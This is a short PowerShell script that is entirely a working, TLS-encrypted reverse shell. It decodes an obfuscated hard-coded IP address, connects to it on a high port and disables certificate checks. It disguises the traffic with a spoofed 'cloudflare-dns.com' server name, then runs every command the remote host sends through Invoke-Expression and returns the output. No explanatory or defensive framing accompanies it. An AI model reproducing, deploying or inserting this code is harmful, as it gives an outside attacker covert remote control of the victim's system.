try {
    $p = [System.Security.Authentication.SslProtocols]::Tls12
    
    $h = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('MTQ2LjcwLjI0MC4yMDU='))
    $prt = 53051

    $c = New-Object Net.Sockets.TCPClient($h, $prt)
    $ns = $c.GetStream()
    
    $sl = New-Object Net.Security.SslStream($ns, $false, ({"$true"} -as [Net.Security.RemoteCertificateValidationCallback]))
    
    $sni = "cloud" + "flare-dns" + ".com"
    $sl.AuthenticateAsClient($sni, $null, $p, $false)

    if(!$sl.IsEncrypted -or !$sl.IsSigned) {
        $sl.Close()
        exit
    }

    $sw = New-Object IO.StreamWriter($sl)
    $sw.AutoFlush = $true

    function Out-Flow ($txt) {
        [byte[]]$script:buf = New-Object System.Byte[] 4096
        $sw.Write($txt + "PS " + (Get-Location).Path + "> ")
    }

    Out-Flow ''

    while(($r = $sl.Read($buf, 0, $buf.Length)) -gt 0) {
        $cmd = ([text.encoding]::UTF8).GetString($buf, 0, $r - 1).Trim()
        
        if ($cmd -eq 'exit') { break }
        
        $res = try {
            Invoke-Expression $cmd 2>&1 | Out-String
        } catch {
            $_ | Out-String
        }
        
        Out-Flow ($res)
    }

    $sw.Close()
    $c.Close()
} catch {
    exit
}
